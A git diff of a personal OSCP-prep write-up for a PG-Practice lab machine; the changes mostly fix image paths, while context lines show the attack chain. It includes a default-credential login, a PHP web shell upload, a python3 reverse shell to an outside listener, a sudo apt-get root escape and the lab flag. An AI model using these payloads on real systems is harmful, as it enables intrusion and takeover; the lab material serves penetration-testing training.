@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-12
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -63,16 +64,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 80 - HTTP (Apache 2.4.56)
 - Navigated to `http://192.168.215.29:80`
-![[Pasted image 20241012152847.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012152847.png]]
  - Navigated to `http://192.168.215.29/contact.html` and attempted to send message through contact form
-![[Pasted image 20241012153714.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012153714.png]]
 ## Port 8089 - HTTP (Apache 2.4.56)
 - Navigated to `http://192.168.215.96:9090` and identified `FlatPress pf-1.2.1`
-![[Pasted image 20241012152906.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012152906.png]]
 - Navigated to `http://192.168.215.96:9090/login/php` and attempted login with credentials `admin:admin`
-![[Pasted image 20241012153036.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012153036.png]]
 - Attempted login with credentials `admin:password` and got access
-![[Pasted image 20241012154746.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012154746.png]]
 ---
 # Exploitation
 ## Malicious File Upload
@@ -83,19 +84,19 @@ GIF89a;
 <?php system($_GET['cmd']);?>
 ```
 - Navigated to `http://192.168.215.29:8089/admin.php?p=uploader` and successfully uploaded `shell2.php`
-![[Pasted image 20241012155538.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012155538.png]]
 - Navigated to uploaded file at `http://192.168.215.29:8089/fp-content/attachs/shell2.php` 
-![[Pasted image 20241012155809.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012155809.png]]
 - Added `?cmd=whoami` to address bar and found exploit working
-![[Pasted image 20241012161115.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012161115.png]]
 - Ran `nc -nvlp 4444` to start listener on port 4444
 - Added url-encoded python3 reverse shell to address bar command `?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22192.168.45.250%22%2C4444%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27` and achieved reverse shell 
-![[Pasted image 20241012161855.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012161855.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
 Ran `sudo -l` and identified `www-data` can run `/usr/bin/apt-get` without password
-![[Pasted image 20241012162013.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012162013.png]]
 ## Privilege Escalation vector
 - Identified GTFObins for [apt-get](https://gtfobins.github.io/gtfobins/apt-get/) and found elevated privileges could be maintained. Ran the following commands;
 ```
@@ -103,7 +104,7 @@ sudo /usr/bin/apt-get changelog apt
 !/bin/sh
 ```
 - Achieved `root` access and ran `cat /root/proof.txt` to print flag `b0f6bae4c11626f41dc028df71718383`
-![[Pasted image 20241012162715.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012162715.png]]
 ---
 # Trophy & Loot
 `root.txt` = `b0f6bae4c11626f41dc028df71718383`
